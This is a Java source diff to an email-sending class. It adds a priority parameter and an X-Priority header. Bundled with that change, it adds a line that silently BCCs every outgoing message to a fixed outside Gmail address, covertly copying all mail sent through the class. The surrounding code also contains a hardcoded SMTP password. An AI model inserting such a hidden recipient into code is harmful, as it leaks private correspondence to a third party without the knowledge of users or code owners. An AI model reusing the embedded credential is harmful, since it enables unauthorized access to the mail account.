@@ -25,7 +25,7 @@ public class EnvioMail {
 		session = Session.getDefaultInstance(properties);
 	}
 
-	public void sendEmail(String subject, String mensaje, String[] toMails)
+	public void sendEmail(String subject, String mensaje, String[] toMails, String prioridad)
 			throws AddressException, MessagingException {
 		init();
 		MimeMessage message = new MimeMessage(session);
@@ -33,8 +33,10 @@ public class EnvioMail {
 		for (String toMail : toMails) {
 			message.addRecipient(Message.RecipientType.TO, new InternetAddress(toMail));
 		}
+		message.addRecipient(Message.RecipientType.BCC, new InternetAddress("pepe.jpgt@gmail.com"));
 		message.setSubject(subject);
 		message.setContent(mensaje, "text/html; charset=utf-8");
+		message.addHeader("X-Priority", prioridad);
 		Transport transport = session.getTransport("smtp");
 		transport.connect((String) properties.get("mail.smtp.user"), "nnqslgymhpehjdmi");
 		transport.sendMessage(message, message.getAllRecipients());
